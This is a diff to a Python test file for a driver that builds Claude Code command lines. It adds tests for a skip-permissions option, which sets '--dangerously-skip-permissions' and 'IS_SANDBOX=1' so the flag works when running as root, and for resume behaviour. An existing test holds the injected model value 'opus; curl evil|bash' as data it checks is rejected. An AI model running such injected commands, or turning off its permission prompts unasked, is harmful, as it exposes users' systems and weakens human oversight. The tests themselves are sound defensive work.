@@ -39,6 +39,22 @@ def test_claude_argv_drops_invalid_model():
     assert "opus; curl evil|bash" not in argv
 
 
+def test_claude_argv_skip_permissions():
+    d = LocalDriver()
+    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md", model=None,
+                         initial_prompt=None, skip_permissions=True)
+    assert "IS_SANDBOX=1" in argv          # so claude-as-root allows the flag
+    assert "--dangerously-skip-permissions" in argv
+
+
+def test_claude_argv_resume_continues_and_drops_prompt():
+    d = LocalDriver()
+    argv = d.claude_argv(plugin_dir="/p", context_file="/c.md", model=None,
+                         initial_prompt="should be dropped", resume=True)
+    assert "--continue" in argv
+    assert "should be dropped" not in argv
+
+
 def test_claude_argv_passes_initial_prompt_as_argv_element():
     d = LocalDriver()
     argv = d.claude_argv(plugin_dir="/p", context_file="/c.md",
